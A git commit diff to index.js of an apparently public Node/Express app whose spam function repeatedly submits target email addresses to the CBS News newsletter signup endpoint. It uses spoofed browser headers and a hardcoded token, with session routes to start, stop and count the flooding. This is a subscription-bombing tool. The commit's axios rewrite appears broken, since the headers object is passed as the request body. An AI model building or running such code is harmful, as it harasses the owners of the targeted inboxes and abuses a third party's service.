b7bd717510e299e54cbc7f1fe738979bdb2e9e97
Crazystuffxyz <125907466+crazystuffofficial@users.noreply.github.com>
2024-07-12 22:22:29 +0530

    Update index.js

--- index.js
+++ index.js
@@ -1,11 +1,12 @@
-import express from "express";
-import fetch from "node-fetch";
-import path from "path";
-import { v4 as uuidv4 } from "uuid"; // for generating unique session IDs
+const express = require("express");
+const axios = require("axios");
+const path = require("path");
+const { v4: uuidv4 } = require("uuid"); // for generating unique session IDs
 
 const __dirname = process.cwd();
 const app = express();
 let stopFlag = false;
+
 function removeElementFromArray(array, elementToRemove) {
     const index = array.indexOf(elementToRemove);
     if (index !== -1) {
@@ -13,46 +14,43 @@ function removeElementFromArray(array, elementToRemove) {
     }
     return array;
 }
+
 const sessions = {}; // To store data for each session
 
-function spam(sessionId, theemail) {
+async function spam(sessionId, theemail) {
     if (stopFlag) {
         console.log("Spam operation stopped.");
         return;
     }
 
-    return fetch('https://www.cbsnews.com/newsletters/xhr/signup', {
-        method: 'POST',
-        headers: {
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'text/plain',
-            'cookie': '',
-            'dnt': '1',
-            'origin': 'https://www.cbsnews.com',
-            'priority': 'u=1, i',
-            'referer': 'https://www.cbsnews.com/embed/newsletters/widget?v=2287029998c5246c93d6dd038eb30603&subs=m40186',
-            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
-        },
-        body: `{"email":"${theemail}","sub":"m40186,m40183","token":"vDZ3zu26GBfyrHadfFbi0Zvnhfsa_jsBAyPrIbgcy3I","mCodeOptin":"m40183"}`
-    })
-        .then((response) => {
-            sessions[sessionId].num++;
-            return response.text();
-        })
-        .then((text) => {
-            console.log(text);
-        })
-        .catch((e) => {
-            sessions[sessionId].errs++;
-            sessions[sessionId].errorMessages.push(e.message);
+    try {
+        const response = await axios.post('https://www.cbsnews.com/newsletters/xhr/signup', {
+            headers: {
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'text/plain',
+                'cookie': '',
+                'dnt': '1',
+                'origin': 'https://www.cbsnews.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.cbsnews.com/embed/newsletters/widget?v=2287029998c5246c93d6dd038eb30603&subs=m40186',
+                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
+            },
+            data: `{"email":"${theemail}","sub":"m40186,m40183","token":"vDZ3zu26GBfyrHadfFbi0Zvnhfsa_jsBAyPrIbgcy3I","mCodeOptin":"m40183"}`
         });
+
+        sessions[sessionId].num++;
+        console.log(response.data);
+    } catch (e) {
+        sessions[sessionId].errs++;
+        sessions[sessionId].errorMessages.push(e.message);
+    }
 }
 
 function executeSpam(sessionId, emails, emailCount, emailsToSpam, interval) {
@@ -89,6 +87,7 @@ app.use((req, res, next) => {
     } else res.locals.cookie = {};
     next();
 });
+
 app.get("/sendMail/:id1/:id2/index.html", (req, res) => {
     try {
         const sessionId = uuidv4(); // Generate a unique session ID
@@ -129,6 +128,7 @@ app.post("/stopSpam", (req, res) => {
     stopFlag = true;
     res.send("Spam operation stopped.");
 });
+
 app.post("/cleanUp", (req, res) => {
     const sessionId = res.locals.cookie.sessionId;
     if (sessions[sessionId]) {
